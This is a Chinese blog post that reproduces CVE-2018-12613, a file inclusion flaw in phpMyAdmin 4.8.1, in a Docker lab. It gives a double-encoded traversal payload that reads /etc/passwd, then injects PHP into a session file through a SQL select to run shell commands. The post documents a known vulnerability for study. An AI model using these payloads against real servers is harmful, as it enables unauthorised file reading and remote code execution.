# phpmyadmin 4.8.1 远程文件包含漏洞（CVE-2018-12613） - NoCirc1e - 博客园

> 原文：[`www.cnblogs.com/NoCirc1e/p/16283215.html`](https://www.cnblogs.com/NoCirc1e/p/16283215.html)

phpMyAdmin 是一套开源的、基于 Web 的 MySQL 数据库管理工具。其 index.php 中存在一处文件包含逻辑，通过二次编码即可绕过检查，造成远程文件包含漏洞。

参考文档：

*   [`mp.weixin.qq.com/s/HZcS2HdUtqz10jUEN57aog`](https://mp.weixin.qq.com/s/HZcS2HdUtqz10jUEN57aog)
*   [`www.phpmyadmin.net/security/PMASA-2018-4/`](https://www.phpmyadmin.net/security/PMASA-2018-4/)

## 漏洞环境

执行如下命令，启动 phpmyadmin 4.8.1：

```
docker-compose up -d
```

![](img/12b30a7ec514d255c305e59280700350.png)

环境启动后，访问`http://your-ip:8080`，即可进入 phpmyadmin。配置的是“config”模式，所以无需输入密码，直接登录 test 账户。

![](img/fa7cb3a6c9e7a7d40d7cf9cf64c27412.png)

## 漏洞复现

尝试读取/etc/passwd
构造 payload：

```
index.php?target=db_sql.php%253f/../../../../etc/passwd 
```

![](img/f7e83e9a5627c6b0c0300a37551e7ede.png)

漏洞存在

在 SQL 中执行 select '<?php phpinfo() ?>';，然后查看当前页面 cookie 中的 phpmyadmin 的值

![](img/57654ca2c862b4e4d456fa2f6d7d6b2b.png)![](img/1b8e698e5ba74acd60dc650d6aab5bf7.png)

包含 session 文件

```
http://192.168.75.130:8080/index.php?target=db_sql.php%253f/../../../../../../../../tmp/sess_d3a37537d1314fd70ad53dc67cb18564
```

![](img/00695819370e0c4952786f9674297cc2.png)

构造执行命令的语句，返回命令执行的结果

`select '<?php echo `ls` ?>';` 

![](img/ea81906b60c1783e10b34820ddea1bdb.png)![](img/213d7ef379931da8956f69dea80ed3e7.png)